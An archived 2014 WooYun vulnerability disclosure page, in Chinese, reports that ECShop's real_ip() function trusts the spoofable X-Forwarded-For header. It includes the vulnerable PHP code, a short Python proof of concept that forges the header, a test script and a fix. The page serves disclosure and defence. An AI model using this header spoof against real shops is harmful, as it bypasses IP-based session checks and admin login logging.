@@ -1,0 +1,271 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		ecshop可绕过ip安全校验  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		ecshop可绕过ip安全校验  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/ksc">ksc</a> 
+</li><li>提交时间：		2014-01-20 14:31</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2014-01-20：	细节已通知厂商并且等待厂商处理中<br/>
+									2014-01-25：	厂商主动忽略漏洞，细节向第三方安全合作伙伴开放<br/>
+									2014-04-17：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">伪造ip，绕过与ip相关的任何限制</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail"></p><pre><code>/**<br />
+ * 获得用户的真实IP地址<br />
+ *<br />
+ * @access  public<br />
+ * @return  string<br />
+ */<br />
+function real_ip()<br />
+{<br />
+    static $realip = NULL;<br />
+<br />
+    if ($realip !== NULL)<br />
+    {<br />
+        return $realip;<br />
+    }<br />
+<br />
+    if (isset($_SERVER))<br />
+    {<br />
+        if (isset($_SERVER[&#039;HTTP_X_FORWARDED_FOR&#039;]))<br />
+        {<br />
+            $arr = explode(&#039;,&#039;, $_SERVER[&#039;HTTP_X_FORWARDED_FOR&#039;]);<br />
+<br />
+            /* 取X-Forwarded-For中第一个非unknown的有效IP字符串 */<br />
+            foreach ($arr AS $ip)<br />
+            {<br />
+                $ip = trim($ip);<br />
+<br />
+                if ($ip != &#039;unknown&#039;)<br />
+                {<br />
+                    $realip = $ip;<br />
+<br />
+                    break;<br />
+                }<br />
+            }<br />
+        }<br />
+        elseif (isset($_SERVER[&#039;HTTP_CLIENT_IP&#039;]))<br />
+        {<br />
+            $realip = $_SERVER[&#039;HTTP_CLIENT_IP&#039;];<br />
+        }<br />
+        else<br />
+        {<br />
+            if (isset($_SERVER[&#039;REMOTE_ADDR&#039;]))<br />
+            {<br />
+                $realip = $_SERVER[&#039;REMOTE_ADDR&#039;];<br />
+            }<br />
+            else<br />
+            {<br />
+                $realip = &#039;0.0.0.0&#039;;<br />
+            }<br />
+        }<br />
+    }<br />
+    else<br />
+    {<br />
+        if (getenv(&#039;HTTP_X_FORWARDED_FOR&#039;))<br />
+        {<br />
+            $realip = getenv(&#039;HTTP_X_FORWARDED_FOR&#039;);<br />
+        }<br />
+        elseif (getenv(&#039;HTTP_CLIENT_IP&#039;))<br />
+        {<br />
+            $realip = getenv(&#039;HTTP_CLIENT_IP&#039;);<br />
+        }<br />
+        else<br />
+        {<br />
+            $realip = getenv(&#039;REMOTE_ADDR&#039;);<br />
+        }<br />
+    }<br />
+<br />
+    preg_match(&quot;/[\d\.]{7,15}/&quot;, $realip, $onlineip);<br />
+    $realip = !empty($onlineip[0]) ? $onlineip[0] : &#039;0.0.0.0&#039;;<br />
+<br />
+    return $realip;<br />
+}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+问题出在上面这个函数上<br />
+<br />
+ip地址优先使用HTTP_X_FORWARDED_FOR 而这个是不可以信的<br />
+<br />
+可以是用程序修改http头部伪造<br />
+<br />
+而ecshop很多地方与安全相关的认证都建立在real_ip()这个函数可靠的基础之上<br />
+<br />
+比如cls_session.php的ip校验<br />
+<br />
+后台管理员ip登录记录 等等 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">python代码伪造X-Forwarded-For<br />
+<br />
+</p><pre><code>import sys<br />
+import httplib<br />
+<br />
+ip = &quot;127.0.0.1 ,10.0.0.1&quot; <br />
+headers = { <br />
+    &quot;X-Forwarded-For&quot;:ip<br />
+    } <br />
+con = httplib.HTTPConnection(&quot;www.test.com&quot;,timeout=10)<br />
+try: <br />
+    con.request(&quot;GET&quot;, &quot;/iptest.php&quot;,&#039;&#039;, headers)<br />
+except Exception, e: <br />
+    print e <br />
+    sys.exit(1) <br />
+<br />
+<br />
+print con.getresponse().read()</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+新建iptest.php放到根目录<br />
+<br />
+</p><pre><code>&lt;?php<br />
+define(&#039;IN_ECS&#039;, true);<br />
+<br />
+require(dirname(__FILE__) . &#039;/includes/init.php&#039;);<br />
+echo real_ip()</code></pre><p class='detail'> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">关键的代码不使用HTTP_X_FORWARDED_FOR中的信息 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/ksc" title="ksc">ksc</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-049068" title="ecshop可绕过ip安全校验">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：无影响厂商忽略</p>
+													<p class="detail">忽略时间：2014-01-25 14:31</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail"></p>
+											
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="49068";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
